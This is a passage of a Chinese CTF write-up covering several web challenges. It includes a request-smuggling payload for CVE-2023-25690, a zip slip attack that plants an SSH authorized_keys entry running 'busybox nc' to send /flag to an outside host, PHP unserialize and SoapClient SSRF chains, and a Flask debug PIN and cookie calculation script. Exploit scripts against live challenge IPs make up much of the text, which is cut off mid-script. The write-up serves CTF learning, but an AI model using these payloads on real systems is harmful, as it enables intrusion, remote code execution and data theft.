+            <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/?data=</span><span class="si">{</span><span class="n">write_session_params</span><span class="si">}</span><span class="s">&amp;cmd=unserialze</span><span class="sh">"</span><span class="p">,</span>
+            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span>
+        <span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+
+<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">PHPSESSID</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">afkl</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">*/*</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/?data=</span><span class="si">{</span><span class="n">trigger_sleep_params</span><span class="si">}</span><span class="s">&amp;cmd=unserialze</span><span class="sh">"</span><span class="p">,</span> 
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span>
+    <span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">(flag\{.*\})</span><span class="sh">"</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="nf">rm_tmp_file</span><span class="p">()</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="nf">copy_flag</span><span class="p">()</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="nf">upload_session</span><span class="p">()</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="nf">get_flag</span><span class="p">()</span>
+</code></pre></div></div>
+<p>题目 nginx 有些不太稳定，多加几个 sleep，多发几次。</p>
+
+<h2 id="参考资料">参考资料</h2>
+<ul>
+  <li><a href="https://www.synacktiv.com/en/publications/playing-with-imagetragick-like-its-2016.html">Playing with ImageTragick like it’s 2016</a></li>
+  <li><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub</a></li>
+  <li><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a></li>
+  <li><a href="https://imagetragick.com/">ImageTragick</a></li>
+</ul>
+
+<h1 id="ezcheckin">ezcheckin</h1>
+<p>请求走私， 具体细节可以查看参考文档， exp 如下：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/2023/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3dxxx.xxx.xxx.xxx:9999/%3f
+</code></pre></div></div>
+
+<h2 id="参考">参考</h2>
+<ul>
+  <li><a href="https://github.com/dhmosfunk/CVE-2023-25690-POC">dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.</a></li>
+</ul>
+
+<h1 id="sycserver">SycServer</h1>
+<blockquote>
+  <p>VAnZY鸽鸽写了个网站，但是没写前端，你知道怎么用嘛
+159.138.131.31:8888
+119.13.91.238:8888
+Note:the server will be reloaded every 90s
+<a href="https://adworld.xctf.org.cn/media/file/task/2bc37908-649d-4924-b0e9-32adb7baef6a.zip">附件下载</a></p>
+</blockquote>
+
+<p>附件是一个用 go 编写的 http 服务。运行之后可以查看到路由信息：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>GIN-debug] <span class="o">[</span>WARNING] Running <span class="k">in</span> <span class="s2">"debug"</span> mode. Switch to <span class="s2">"release"</span> mode <span class="k">in </span>production.
+ - using <span class="nb">env</span>:   <span class="nb">export </span><span class="nv">GIN_MODE</span><span class="o">=</span>release
+ - using code:  gin.SetMode<span class="o">(</span>gin.ReleaseMode<span class="o">)</span>
+
+<span class="o">[</span>GIN-debug] POST   /file-unarchiver          <span class="nt">--</span><span class="o">&gt;</span> main.fileUnarchiver <span class="o">(</span>3 handlers<span class="o">)</span>
+<span class="o">[</span>GIN-debug] GET    /                         <span class="nt">--</span><span class="o">&gt;</span> main.funkYou <span class="o">(</span>3 handlers<span class="o">)</span>
+<span class="o">[</span>GIN-debug] GET    /readir                   <span class="nt">--</span><span class="o">&gt;</span> main.readir <span class="o">(</span>3 handlers<span class="o">)</span>
+<span class="o">[</span>GIN-debug] GET    /admin                    <span class="nt">--</span><span class="o">&gt;</span> main.admin <span class="o">(</span>3 handlers<span class="o">)</span>
+<span class="o">[</span>GIN-debug] GET    /readfile                 <span class="nt">--</span><span class="o">&gt;</span> main.readfile <span class="o">(</span>3 handlers<span class="o">)</span>
+<span class="o">[</span>GIN-debug] <span class="o">[</span>WARNING] You trusted all proxies, this is NOT safe. We recommend you to <span class="nb">set </span>a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies <span class="k">for </span>details.
+<span class="o">[</span>GIN-debug] Listening and serving HTTP on 0.0.0.0:8888
+</code></pre></div></div>
+<p>结合逆向分析与前端测试，每个路由的功能如下：</p>
+<ol>
+  <li>/readfile?file= 可以进行文件读取.</li>
+  <li>/readir 默认情况下可以读取根目录.</li>
+  <li>/file-unarchiver 可以上传一个 zip 文件并解压。</li>
+  <li>/admin 可以连接本地 2221 端口，以 vanzy 用户登陆本地 ssh，登陆之后执行 ls 命令。整个步骤需要在 vanzy 用户的 .ssh 目录下放置私钥和 authorized_keys。</li>
+</ol>
+
+<p>/file-unarchiver 可以上传文件并解压，很容易想到 zip slip 攻击，利用解压后的文件覆盖 /home/vanzy/.ssh/authorized_keys 就可以直接连接到目标。利用 readfile 接口可以读取 ssh 配置文件，在配置文件中也可以确认目标开启了 ssh 公私钥登陆。</p>
+
+<p>zip slip payload 可以使用工具 <a href="https://github.com/usdAG/slipit">slipit</a>。本地生成 RSA 公私钥，然后使用如下的命令生成。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/kali/.ssh/id_rsa <span class="o">&gt;</span> /home/kali/.ssh/authorized_keys
+slipit upload/upload.zip /home/kali/.ssh/authorized_keys <span class="nt">--prefix</span> /home/vanzy/.ssh <span class="nt">--separator</span> /
+</code></pre></div></div>
+<p>生成得到 upload.zip，将其上传之后可以覆写  /home/vanzy/.ssh/authorized_keys, 写入后可以使用 readfile 进行验证。</p>
+
+<p>测试时发现目标开放了 22 端口，但即使写入了 authorized_keys 也没有办法登陆，猜测暴露的 22 端口并非题目环境的 ssh 服务（不然也不会提供 /admin 路由）。</p>
+
+<p>/admin 路由需要提供 authorized_keys 和 id_rsa。需要再次利用 zip slip 上传 id_rsa。<strong>注意 authorized_keys 需要 600 权限。</strong></p>
+
+<p>能够公私钥连接 ssh 后，下一步考虑如何，执行命令，最初的想法是覆盖 .ashrc(题目环境为 busybox，可以使用 readfile 进行读取) 加入反弹 shell 的命令，但题目在使用 ssh 连接时，使用了类似 exec 直接执行 ls 命令，此时便不会加载 rc 文件。</p>
+
+<p>但公私钥登陆时，需要执行的命令还可以直接写在 authorized_keys 文件中，参考：<a href="https://www.virtono.com/community/tutorial-how-to/restrict-executable-ssh-commands-with-authorized-keys/">Restrict Executable SSH Commands With Authorized Keys - Virtono Community</a></p>
+
+<p>command 选项本身的用意，是限制该密钥的只能执行的命令。例如：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> .ssh/authorized_keys 
+<span class="nb">command</span><span class="o">=</span><span class="s2">"date"</span> ssh-rsa AAAA <span class="o">[</span> ... <span class="o">]</span>
+</code></pre></div></div>
+<p>在 authorized_keys 中添加 command 属性，客户端连接时会自动执行该指令。因此我们可以直接在 command 属性中添加反弹 shell payload。</p>
+
+<p>整个题目的利用流程如下：</p>
+<ol>
+  <li>利用 zip slip 上传 id_rsa</li>
+  <li>利用 zip slip 上传 authorized_keys，其中 command 属性填充反弹 shell 语句</li>
+  <li>访问 /admin</li>
+</ol>
+
+<p>最终 authorized_keys，其中 如下：</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">command</span><span class="o">=</span><span class="s2">"busybox nc xxx.xxx.xxx.xxx 9999 -e cat /flag"</span>  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCcrjOMU/UreyjVp+be4kxHr/rT5LUIviQVwoJNbbwdVD1enfLlbaI28A3dt7ORXUD8X1fCmfr3tZXcSQlsTxrmzcq/YOSdCDxN+xbD8JBCAzJEWee17PrTxAHBitOLL2YZSOJYHLclAhKXtzDT7Yj8ZCpXKqgIjoc02xFQSj8YZ1ep6m9xrL9oedkJ1VlI4SckB2Wlnxbw7daY3zBnKDd3lWBx0pn0rUDr/CcdEJVpTvqUCscRCkb4lpPS1nGrl9qAy0zauRhPH10zyAuMgsSPQXUKgP+GEcgsyBYy5P+w3O4xh2K3G8nEfHsop4b9NraU3So3bZvQxemX3wW8PF8TpHHex/GrQW8ilM7mWC6d7sEc7ElV8gAnNw+P7X1cl0YS5eUTN35U51mCUaDNKQi3hgdSy9TU2UQyeJxz+c+wrZjpsjetgVTcScbw6ZDIKeuVsDCd3+TKJwgVsnjENACXAW49NseS+uu/12u+4MBBtkEIhaeu/T05gBgAm9FU+Vc<span class="o">=</span> kali@kali
+</code></pre></div></div>
+
+<p>利用 exp 如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">zipfile</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://119.13.91.238:8888/</span><span class="sh">"</span>
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">local_file</span><span class="p">,</span> <span class="n">remote_path</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">gen_payload</span><span class="p">():</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">rm ./upload/upload.zip</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">slipit upload/upload.zip </span><span class="si">{</span><span class="n">local_file</span><span class="si">}</span><span class="s"> --prefix </span><span class="si">{</span><span class="n">remote_path</span><span class="si">}</span><span class="s"> --separator /</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] gen payload done</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">upload_request</span><span class="p">():</span>
+        <span class="n">dfile</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./upload/upload.zip</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">file-unarchiver</span><span class="sh">"</span><span class="p">,</span> <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">:</span> <span class="n">dfile</span><span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span> <span class="o">!=</span> <span class="sh">""</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] upload to </span><span class="si">{</span><span class="n">remote_path</span><span class="si">}</span><span class="s"> done</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="nf">gen_payload</span><span class="p">()</span>
+    <span class="nf">upload_request</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">read_remote_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">readfile?file=</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] read file </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">admin</span><span class="sh">"</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] tigger admin</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="c1"># global url 
+</span>    <span class="c1"># url = "http://192.168.137.131:8888/"
+</span>    <span class="nf">upload_file</span><span class="p">(</span><span class="sh">"</span><span class="s">~/.ssh/authorized_keys</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">/home/vanzy/.ssh</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">upload_file</span><span class="p">(</span><span class="sh">"</span><span class="s">~/.ssh/id_rsa</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">/home/vanzy/.ssh</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">read_remote_file</span><span class="p">(</span><span class="sh">"</span><span class="s">/home/vanzy/.ssh/authorized_keys</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">get_flag</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">exp</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="参考资料-1">参考资料</h2>
+<ul>
+  <li><a href="https://www.virtono.com/community/tutorial-how-to/restrict-executable-ssh-commands-with-authorized-keys/">Restrict Executable SSH Commands With Authorized Keys - Virtono Community</a></li>
+</ul>
+
+<h1 id="pypyp">pypyp</h1>
+<blockquote>
+  <p>地址 /url</p>
+
+  <p>http://115.239.215.75:8081/</p>
+
+  <p>提示 /hint</p>
+
+  <p>a piece of cake but hard work。per 5 min restart.</p>
+
+  <p>pay attention to /app/app.py</p>
+</blockquote>
+
+<p>访问 http://115.239.215.75:8081/ 会提示 Session not started. 使用 PHP_SESSION_UPLOAD 将 session 初始化后可以看到源码, 源码如下:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">)){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'Session not started'</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
+    <span class="nv">$properties</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'properties'</span><span class="p">];</span>
+    <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
+    <span class="nb">extract</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]));</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">))){</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$properties</span><span class="p">));</span>
+        <span class="nv">$object</span> <span class="o">-&gt;</span> <span class="nf">sctf</span><span class="p">();</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$properties</span><span class="p">)){</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$type</span><span class="p">(</span><span class="nv">$properties</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$properties</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$object</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'http://127.0.0.1:5000/'</span><span class="mf">.</span><span class="nv">$properties</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="s2">"this is the object: </span><span class="nv">$object</span><span class="s2"> &lt;br&gt;"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>源码可以将 post 参数 data 的内容进行反序列化, 然后使用 extract 进行赋值, extract 存在变量覆盖漏洞. 将 data 反序列化后有三个分支:</p>
+
+<ol>
+  <li>如果 properties 可以再次反序列化, 则将其反序列化后调用 sctf 方法, 这是一个很明显的 SoapClient SSRF 场景.</li>
+  <li>如果 properties 是一个数组, 则可以进行 type 类的实例化, 这里是一个内置类的利用场景. 参数为 2 时, 可以利用 SplFileObject 进行文件读取.</li>
+  <li>最后一个分支可以访问本地的 5000 端口.</li>
+</ol>
+
+<p>本地 5000 端口通常是一个 flask 应用, 题目了提示 /app/app.py 文件, 利用文件读取漏洞获取到其内容如下, 是一个 flask debug 页面.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">return</span> <span class="sh">'</span><span class="s">Hello World!</span><span class="sh">'</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>结合 flask debug RCE 的利用思路, 整体攻击思路较为清晰:</p>
+<ol>
+  <li>通过 file_get_contents 访问 http://127.0.0.1:5000/console, 获取到 secret</li>
+  <li>利用文件读取漏洞, 读取计算 flask cookie 值的所需要的文件内容.</li>
+  <li>计算 cookie 值.</li>
+  <li>利用 SoapClient SSRF 访问 flask debug 页面, 添加 Cookie 头执行命令.</li>
+</ol>
+
+<p><strong>注意</strong>: 大多数介绍 flask debug rce 的文章, 介绍的都是先计算 pin 然后通过 pinauth 获取 cookie 值, 实际上计算完 pin 后可以直接计算 cookie, cookie 名和 cookie 值都可以直接算出, 具体可以参考:</p>
+
+<p>计算 cookie 值所需的内容与计算 pin 码一致:</p>
+<ol>
+  <li>用户名: root (读取 /etc/passwd 后发现用户为 app)</li>
+  <li>modname: 一般是 flask.app</li>
+  <li><code class="language-plaintext highlighter-rouge">getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> 的值, 一般是 Flask</li>
+  <li>
+    <p>模块路径: 通常是 /usr/local/lib/python3.x/dist-packages/flask/app.py 或者 site-packages/flask/app.py. python 的路径有可能是 /usr/local/lib/python3.x 或者 /usr/lib/python3.x , 都可以尝试一下读取这些路径.</p>
+  </li>
+  <li>/sys/class/net/eth0/address 十进制值</li>
+  <li>/etc/machine-id 或者 /proc/sys/kernel/random/boot_id 以及 /proc/self/cgroup 最后一个 / 后的内容</li>
+</ol>
+
+<p>计算 cookie 脚本如下.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">from</span> <span class="n">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="k">def</span> <span class="nf">calc</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span><span class="n">private_bits</span><span class="p">):</span>
+    <span class="c1">#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
+</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="nf">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+            <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">h</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+    <span class="n">h</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">cookiesalt</span><span class="sh">'</span><span class="p">)</span>
+    <span class="c1">#h.update(b'shittysalt')
+</span>
+    <span class="n">cookie_name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">__wzd</span><span class="sh">'</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+    <span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">h</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">pinsalt</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="nf">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span><span class="si">:</span><span class="mi">09</span><span class="n">d</span><span class="si">}</span><span class="sh">"</span><span class="p">[:</span><span class="mi">9</span><span class="p">]</span>
+
+    <span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+    <span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">rv</span> <span class="o">=</span> <span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span>
+                    <span class="n">num</span><span class="p">[</span><span class="n">x</span> <span class="p">:</span> <span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="nf">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">)</span>
+                    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">)</span>
+                <span class="p">)</span>
+                <span class="k">break</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="n">numapp</span>
+    <span class="k">return</span> <span class="n">cookie_name</span><span class="p">,</span> <span class="n">rv</span>
+
+<span class="k">def</span> <span class="nf">hash_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s"> added salt</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">replace</span><span class="sh">"</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">gen_pin_and_cookie</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">mod_file</span><span class="p">,</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">machine_id</span><span class="p">):</span>
+    <span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">username</span><span class="p">,</span><span class="c1"># username
+</span>        <span class="sh">'</span><span class="s">flask.app</span><span class="sh">'</span><span class="p">,</span><span class="c1"># modname
+</span>        <span class="sh">'</span><span class="s">Flask</span><span class="sh">'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>        <span class="n">mod_file</span> <span class="c1"># getattr(mod, '__file__', None),
+</span>    <span class="p">]</span>
+
+    <span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">uuid</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/eth0/address
+</span>        <span class="n">machine_id</span><span class="c1"># get_machine_id(), /etc/machine-id
+</span>    <span class="p">]</span>
+
